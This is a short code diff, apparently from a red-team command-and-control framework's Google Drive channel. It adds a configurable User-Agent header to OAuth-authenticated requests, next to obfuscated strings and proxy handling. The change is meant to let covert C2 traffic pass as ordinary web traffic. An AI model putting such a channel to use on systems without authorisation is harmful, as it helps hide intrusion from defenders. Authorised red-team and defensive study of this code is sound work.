@@ -20,7 +20,7 @@ namespace
 	}
 }
 
-FSecure::GoogleDrive::GoogleDrive(std::string const& client_id, std::string const& client_secret, std::string const& refresh_token, std::string const& channelName)
+FSecure::GoogleDrive::GoogleDrive(std::string const& userAgent, std::string const& client_id, std::string const& client_secret, std::string const& refresh_token, std::string const& channelName)
 {
 	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
 		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);
@@ -28,7 +28,7 @@ FSecure::GoogleDrive::GoogleDrive(std::string const& client_id, std::string cons
 	this->m_clientId = client_id;
 	this->m_clientSecret = client_secret;
 	this->m_refreshToken = refresh_token;
-
+	this->m_UserAgent = userAgent;
 	RefreshAccessToken();
 	SetChannel(CreateChannel(Convert<Lowercase>(channelName)));
 }
@@ -234,6 +234,8 @@ FSecure::WinHttp::HttpRequest FSecure::GoogleDrive::CreateHttpRequest(FSecure::W
 	if (setAuthorizationHeader)
 		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_accessToken));
 	
+	request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));
+
 	return request;
 }
 
